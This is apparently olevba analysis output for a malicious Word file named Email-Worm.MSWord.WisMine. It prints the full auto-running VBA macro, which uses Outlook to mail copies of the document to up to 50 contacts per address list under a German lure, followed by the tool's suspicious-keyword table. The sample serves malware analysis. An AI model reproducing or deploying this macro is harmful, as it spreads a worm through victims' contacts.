olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.WisMine
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.WisMine - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim outl, mpnm, ofs
Set outl = CreateObject("Outlook.Application")
Set mpnm = outl.GetNameSpace("MAPI")
mpnm.Logon "profile", "password"
For y = 1 To mpnm.AddressLists.Count
Set adbk = mpnm.AddressLists(y)
x = 1
Set ofs = outl.CreateItem(0)
For oo = 1 To adbk.AddressEntries.Count
td = adbk.AddressEntries(x)
ofs.Recipients.Add td
x = x + 1
If x > 50 Then oo = adbk.AddressEntries.Count
Next oo
ofs.Subject = "Nachricht von " & Application.UserName
ofs.Body = "Anbei wie besprochen die Liste"
atti = ActiveDocument.FullName
atti = Mid(atti, 1, Len(atti) - 4)
atti = atti & "_2.doc"
ofs.Attachments.Add atti
ofs.Send
td = ""
Next y
mpnm.Logoff

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

